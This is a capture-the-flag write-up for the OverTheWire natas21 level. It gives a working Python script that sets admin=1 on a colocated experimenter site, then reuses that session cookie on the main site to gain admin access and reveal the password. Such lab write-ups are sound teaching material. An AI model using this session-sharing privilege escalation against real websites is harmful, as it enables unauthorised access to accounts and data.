# natas21

This problem is similar to natas20, but we now have to input admin=1 ourselves and match the cookies from experimenter website to the original website. The python code for this is-

```python
import requests

# URLs for both sites
url = 'http://natas21.natas.labs.overthewire.org/index.php'
experimenter_url = 'http://natas21-experimenter.natas.labs.overthewire.org/index.php'

auth = ('natas21', '<password>')  # replace with the actual password

session = requests.Session()
session.auth = auth

# Step 1: Set the admin variable to 1 on the experimenter site
data = {'admin': '1', 'submit': 'Update'}
response = session.post(experimenter_url, data=data)

# Get the PHPSESSID from the response cookies
phpsessid = response.cookies['PHPSESSID']

# Step 2: Use the same PHPSESSID to view the main site
cookies = {'PHPSESSID': phpsessid}
response = session.get(url, cookies=cookies)

if 'You are an admin' in response.text:
    print('Success! Here is the response:')
    print(response.text)
else:
    print('Failed to get admin access.')
```
We submit admin=1 in the experimenter website which gives us the proper info and cookie, which is now submitted to main url. Since both are colocated, this works and we get our password.
